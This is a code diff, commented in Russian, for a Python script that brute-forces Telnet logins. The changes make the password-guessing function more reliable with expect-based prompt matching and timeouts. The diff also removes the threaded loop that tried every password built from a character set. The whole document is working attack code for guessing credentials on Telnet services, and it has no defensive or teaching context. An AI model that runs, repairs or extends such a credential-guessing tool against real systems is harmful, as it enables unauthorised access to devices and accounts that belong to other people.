@@ -19,25 +19,37 @@ def try_login(username, password):
     if found:
         return
     try:
-        tn = telnetlib.Telnet(host, port, timeout=3)
-        tn.read_until(b"login: ")
+        tn = telnetlib.Telnet(host, port, timeout=5)
+
+        # Ожидаем приглашение логина с таймаутом
+        idx, _, _ = tn.expect([b"login:", b"Login:"], timeout=3)
+        if idx == -1:
+            tn.close()
+            return
+
         tn.write(username.encode() + b"\n")
-        tn.read_until(b"Password: ")
+
+        # Ожидаем запрос пароля
+        idx, _, _ = tn.expect([b"Password:", b"password:"], timeout=3)
+        if idx == -1:
+            tn.close()
+            return
+
         tn.write(password.encode() + b"\n")
-        output = tn.read_some()
-        if b"incorrect" not in output.lower():
+
+        # Ожидаем ответ, ограниченный по времени
+        idx, match, text = tn.expect([b"incorrect", b"failed", b"login"], timeout=3)
+
+        if idx == -1:
+            # Не нашли ошибок — возможно успех
             print(f"\n[!!!] УСПЕХ: {username}:{password}")
             found = True
-        tn.close()
-    except:
-        pass
+        else:
+            # Нашли ошибку — значит неудача
+            pass
 
-with ThreadPoolExecutor(max_workers=max_threads) as executor:
-    for username in logins:
-        for length in range(min_len, max_len + 1):
-            for pwd_tuple in itertools.product(charset, repeat=length):
-                if found:
-                    break
-                password = ''.join(pwd_tuple)
-                print(f"Пробуем: {username}:{password}", end='\r')
-                executor.submit(try_login, username, password)
+        tn.close()
+    except Exception as e:
+        # Можно раскомментировать для отладки:
+        # print(f"Ошибка: {e}")
+        pass
